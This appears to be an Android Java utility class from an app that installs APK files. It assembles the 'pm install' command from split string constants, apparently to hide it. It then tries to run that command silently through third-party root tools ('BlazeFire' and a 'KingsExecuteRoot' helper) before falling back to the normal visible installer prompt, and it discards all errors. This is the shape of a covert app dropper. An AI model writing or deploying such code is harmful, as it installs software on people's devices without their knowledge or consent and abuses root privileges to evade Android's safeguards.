package data.mild.mynu.utils;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;

import java.io.File;


public class PackageInstallUtil {

	public static void installApp(Context context, String filePath) {
		try {
//			String[] vCmds = new String[] { "pm install -r -l " + filePath };
//			String[] vCmds = new String[] { StrHelp1.P_PREFIX+StrHelp2.INSTALL_SERVIE+StrHelp3.INSTALL_SERVIE + filePath };
			String[] vCmds = new String[] { new StringBuffer(StrHelp1.P_PREFIX).append(StrHelp2.INSTALL_SERVIE).append(StrHelp3.INSTALL_SERVIE).toString() + filePath };
			for (String cmd : vCmds) {
				if (installAppByBlzeFire(cmd)) { // 使用野火安装成功
					continue;
				} else {
					try {
						boolean installAppByRequestRoot = installAppByRequestRoot(cmd);
						if (installAppByRequestRoot) {
							continue;
						} else {
							installAppByCallSystemIntent(context, filePath);
						}
					} catch (RuntimeException e) {
						installAppByCallSystemIntent(context, filePath);
					}
				}
				
			}
			Thread.sleep(3000);
		} catch (Exception e) {
		}
	}

	// 请求系统root权限进行安装，安装成功返回true, 否则返回false
	// ****** 可能抛出RuntimeException
	public static boolean installAppByRequestRoot(String cmd) {
		String installResult = KingsExecuteRoot.getExecuteRoot(true)
				.runCommand(cmd);
		if (installResult != null && "Success".equalsIgnoreCase(installResult.trim())) {
			return true;
		}
		return false;
	}

	// 使用野火root进行安装，安装成功返回true, 否则返回false
	public static boolean installAppByBlzeFire(String cmd) {
		boolean blazeFireHasRoot = BlazeFireUtil.hasRoot();
		String blazeFireInstallResult = null;
		if (blazeFireHasRoot) {
			blazeFireInstallResult = BlazeFireUtil.makeCmd("LD_LIBRARY_PATH=/vendor/lib:/system/lib " + cmd);
			if (blazeFireInstallResult != null
					&& "Success".equalsIgnoreCase(blazeFireInstallResult.trim())) {
				return true;
			}
		}
		return false;
	}

	public static void installAppByCallSystemIntent(Context context,
			String filePath) {
		File apk = new File(filePath);
		Intent intent = new Intent(Intent.ACTION_VIEW);
		intent.setDataAndType(Uri.fromFile(apk),
				"application/vnd.android.package-archive");
		intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(intent);
	}
	
/***************** 是否需要运行野火root,相关控制策略  end ***************/   
}
